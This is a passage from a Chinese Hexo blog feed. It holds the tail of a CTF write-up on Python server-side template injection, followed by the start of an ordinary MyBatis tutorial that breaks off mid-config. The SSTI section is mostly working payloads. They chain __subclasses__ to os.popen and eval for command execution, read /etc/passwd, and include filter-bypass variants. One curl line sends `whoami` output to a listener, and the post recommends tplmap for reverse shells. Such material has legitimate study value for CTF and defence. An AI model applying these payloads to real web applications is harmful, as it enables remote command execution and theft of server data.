class="hljs-strong">__builtin__</span>。　　　　　　　　　　　　　　　　　　2.非主模块main中，<span class="hljs-strong">__builtins__</span>仅是对<span class="hljs-strong">__builtin__</span>.<span class="hljs-strong">__dict__</span>的引用，而非<span class="hljs-strong">__builtin__</span>本身<br><br></code></pre></td></tr></table></figure><p>用__globals__更深入的去看每个类可以调用的东西（包括模块，类，变量等等），如果有os这种可以直接传入命令，造成命令执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br>search = <span class="hljs-string">&#x27;os&#x27;</span>   <span class="hljs-comment">#也可以是其他你想利用的模块</span><br>num = -<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__():<br>    num += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> search <span class="hljs-keyword">in</span> i.__init__.__globals__.keys():<br>            <span class="hljs-built_in">print</span>(i, num)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span> <br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;<strong>只能在python2版本使用</strong>&#x3D;&#x3D;</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/1344396-20200903164854386-1155449135.png" alt="img"></p><p>可以看到在元组68，73的位置找到了os方法，这样就可以构造命令执行payload:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqf">().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">68</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">73</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">68</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">73</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/1344396-20200903185803928-864364882.png" alt="img"></p><p>可以使用<code>__builtins__</code>，python2和python3版本都可用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><br>search = <span class="hljs-string">&#x27;__builtins__&#x27;</span><br>num = -<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__():<br>    num += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># print(i.__init__.__globals__.keys())</span><br>        <span class="hljs-keyword">if</span> search <span class="hljs-keyword">in</span> i.__init__.__globals__.keys():<br>            <span class="hljs-built_in">print</span>(i, num)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230214221609361.png" alt="image-20230214221609361"></p><p>这样可以执行命令：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[128]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span>(&quot;__import__(&#x27;os&#x27;)<span class="hljs-selector-class">.system</span>(&#x27;whoami&#x27;)&quot;)<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230214221644950.png" alt="image-20230214221644950"></p><hr><p>一些payload：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs markdown">获得基类<br><span class="hljs-section">#python2.7</span><br>&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[2]<br>&#123;&#125;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>request.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1]<br><span class="hljs-section">#python3.7</span><br>&#x27;&#x27;.<span class="hljs-strong">__。。。class__</span>.<span class="hljs-strong">__mro__</span>[1]<br>&#123;&#125;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0]<br>request.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1]<br><br><span class="hljs-section">#python 2.7</span><br><span class="hljs-section">#文件操作</span><br><span class="hljs-section">#找到file类</span><br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[40]<br><span class="hljs-section">#读文件</span><br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/etc/passwd&#x27;</span>).read()<br><span class="hljs-section">#写文件</span><br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;/tmp&#x27;</span>).write(&#x27;test&#x27;)<br><br><span class="hljs-section">#命令执行</span><br><span class="hljs-section">#os执行</span><br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[59].<span class="hljs-strong">__init__</span>.func<span class="hljs-emphasis">_globals.linecache下有os类，可以直接执行命令：</span><br><span class="hljs-emphasis">[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[59].<span class="hljs-strong">__init__</span>.func_</span>globals.linecache.os.popen(&#x27;id&#x27;).read()<br><span class="hljs-section">#eval,impoer等全局函数</span><br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[59].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>下有eval，<span class="hljs-strong">__import__</span>等的全局函数，可以利用此来执行命令：<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;eval&#x27;</span>](&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[59].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>.eval(&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[0].<span class="hljs-strong">__subclasses__</span>()[59].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>.<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()<br>[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;__import__&#x27;</span>](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()<br><br><span class="hljs-section">#python3.7</span><br><span class="hljs-section">#命令执行</span><br>&#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if c.<span class="hljs-strong">__name__</span>==&#x27;catch<span class="hljs-emphasis">_warnings&#x27; %&#125;&#123;&#123; c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].eval(&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="hljs-emphasis">#文件操作</span><br><span class="hljs-emphasis">&#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if c.<span class="hljs-strong">__name__</span>==&#x27;catch_</span>warnings&#x27; %&#125;&#123;&#123; c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br><span class="hljs-section">#windows下的os命令</span><br>&quot;&quot;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">118</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-link">&#x27;dir&#x27;</span>).read()<br><br></code></pre></td></tr></table></figure><p>绕waf的姿势：</p><p><strong>过滤[</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#getitem、pop<br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">40</span>)(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">59</span>).__init__<span class="hljs-selector-class">.func_globals</span><span class="hljs-selector-class">.linecache</span><span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br><br></code></pre></td></tr></table></figure><p><strong>过滤引号</strong></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">#chr函数</span><br><span class="language-xml">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__.__getitem__</span>(<span class="hljs-name">0</span>).__subclasses__().pop(<span class="hljs-name">40</span>)(<span class="hljs-name">chr</span>(<span class="hljs-name">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">101</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">116</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">119</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">100</span>)).read()&#125;&#125;</span><span class="language-xml">#request对象</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__.__getitem__</span>(<span class="hljs-name">0</span>).__subclasses__().pop(<span class="hljs-name">40</span>)(<span class="hljs-name">request.args.path</span>).read() &#125;&#125;</span><span class="language-xml">&amp;path=/etc/passwd</span><br><span class="language-xml">#命令执行</span><br><span class="language-xml">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__.__getitem__</span>(<span class="hljs-name">0</span>).__subclasses__().pop(<span class="hljs-name">59</span>).__init__.func_globals.linecache.os.popen(<span class="hljs-name">chr</span>(<span class="hljs-name">105</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-name">100</span>)).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__.__getitem__</span>(<span class="hljs-name">0</span>).__subclasses__().pop(<span class="hljs-name">59</span>).__init__.func_globals.linecache.os.popen(<span class="hljs-name">request.args.cmd</span>).read() &#125;&#125;</span><span class="language-xml">&amp;cmd=id</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><strong>滤下划线</strong></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;</span>[request.args.class][request.args.mro][2][request.args.subclasses]()[40](<span class="hljs-name">&#x27;/etc/passwd&#x27;</span>).read() &#125;&#125;</span><span class="language-xml">&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><strong>过滤花括号</strong></p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">#用&#123;%%&#125;标记</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.linecache.os.popen(<span class="hljs-string">&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;</span>).read()==<span class="hljs-string">&#x27;p&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml">1</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><strong>利用示例：</strong></p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><span class="language-xml"></span><br><span class="language-xml">  </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> b <span class="hljs-keyword">in</span> c.__init__.__globals__.values() %&#125;</span><span class="language-xml"></span><br><span class="language-xml">  </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> &#x27;eval&#x27; <span class="hljs-keyword">in</span> b.keys() %&#125;</span><span class="language-xml"></span><br><span class="language-xml">      </span><span class="hljs-template-variable">&#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><span class="language-xml">         //popen的参数就是要执行的命令</span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml">  </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml">  </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/epinna/tplmap">GitHub - epinna&#x2F;tplmap: Server-Side Template Injection and Code Injection Detection and Exploitation Tool</a></p><p>这里推荐自动化工具tplmap，拿shell、执行命令、bind_shell、反弹shell、上传下载文件，Tplmap为SSTI的利用提供了很大的便利</p></blockquote><h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>&#123;&#123;&#125;&#125;</code>进行传递变量和执行简单的表达式。</p><p>以下代码将定义一个TEMPLATE变量作为一个模板文件，然后使用传入的name替换模板中的”FOO”，在进行加载模板并输出，且未对name值进行安全检查输入情况。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tornado.template<br><span class="hljs-keyword">import</span> tornado.ioloop<br><span class="hljs-keyword">import</span> tornado.web<br>TEMPLATE = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string"> &lt;head&gt;&lt;title&gt; Hello &#123;&#123; name &#125;&#125; &lt;/title&gt;&lt;/head&gt;</span><br><span class="hljs-string"> &lt;body&gt; Hello max &lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MainHandler</span>(tornado.web.RequestHandler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self</span>):<br>        name = self.get_argument(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        template_data = TEMPLATE.replace(<span class="hljs-string">&quot;FOO&quot;</span>,name)<br>        t = tornado.template.Template(template_data)<br>        self.write(t.generate(name=name))<br><br>application = tornado.web.Application([(<span class="hljs-string">r&quot;/&quot;</span>, MainHandler),], debug=<span class="hljs-literal">True</span>, static_path=<span class="hljs-literal">None</span>, template_path=<span class="hljs-literal">None</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    application.listen(<span class="hljs-number">8000</span>)<br>    tornado.ioloop.IOLoop.instance().start()<br></code></pre></td></tr></table></figure><p>在tornado模板中，存在一些可以访问的快速对象，比如 <code>&#123;&#123;escape(handler.settings["cookie"])&#125;&#125;</code>，这个其实就是<code>handler.settings</code>对象，里面存储着一些环境变量。</p><h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><h2 id="Java中的SSTI"><a href="#Java中的SSTI" class="headerlink" title="Java中的SSTI"></a>Java中的SSTI</h2><p>java常见的引擎：</p><ul><li>FreeMarker</li><li>velocity</li></ul><h3 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h3><h3 id="celocity"><a href="#celocity" class="headerlink" title="celocity"></a>celocity</h3>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[java] mybatis学习</title>
    <link href="/2023/01/09/%5Bjava%5D%20mybatis%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/01/09/%5Bjava%5D%20mybatis%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="mybatis学习"><a href="#mybatis学习" class="headerlink" title="mybatis学习"></a>mybatis学习</h1><blockquote><p><a href="https://mybatis.org/mybatis-3/zh/index.html">mybatis – MyBatis 3 | 简介</a></p></blockquote><p>MyBatis是一款优秀的持久层框架，用于简化JDBC开发；</p><blockquote><p>持久层：</p><ul><li>负责数据保存到数据库的那一层代码</li><li>JavaEE三层架构：表现层、业务层、持久层</li></ul><p>框架</p><ul><li>框架是一个半成品软件，是一套可重用的、通用的、软件基础代码模型</li><li>在框架的基础上构建软件编写更加高效、规范、通用、可扩展</li></ul></blockquote><p>JDBC的缺点：</p><ul><li>硬编码：<ul><li>注册驱动：URL、用户名、密码</li><li>SQL语句</li></ul></li><li>操作繁琐<ul><li>手动设置参数</li><li>手动封装结果集</li></ul></li></ul><p>MyBatis免除了几乎所有的JDBC代码以及设置参数和获取结果集的工作。MyBatis 可以通过简单的 XML 或注解来配置和映射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。</p><h2 id="MyBatis快速入门"><a href="#MyBatis快速入门" class="headerlink" title="MyBatis快速入门"></a>MyBatis快速入门</h2><p>简单的MyBatis使用步骤：</p><ol><li><p>创建模块，导入坐标</p></li><li><p>编写MyBatis核心配置文件</p></li><li><p>编写SQL映射文件</p></li><li><p>编码</p><ol><li>定义POJO类</li><li>加载核心配置文件，获取<code>SqlSessionFactory</code>对象；</li><li>获取<code>SqlSession</code>对象，执行SQL语句；</li><li>释放资源</li></ol></li></ol><p><strong>通过maven设置依赖</strong></p><p>主要的依赖为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs maven">&lt;dependency&gt;<br>    &lt;groupId&gt;mysql&lt;/groupId&gt;<br>    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;<br>    &lt;version&gt;5.1.47&lt;/version&gt;<br>    &lt;scope&gt;runtime&lt;/scope&gt;<br>&lt;/dependency&gt;<br>&lt;dependency&gt;<br>    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;<br>    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;<br>    &lt;version&gt;3.5.9&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p><strong>创建MyBatis核心配置文件</strong></p><p>在MyBatis有模板：<a href="https://mybatis.org/mybatis-3/zh/getting-started.html">mybatis – MyBatis 3 | 入门</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">configuration</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;https://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--                连接信息--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span 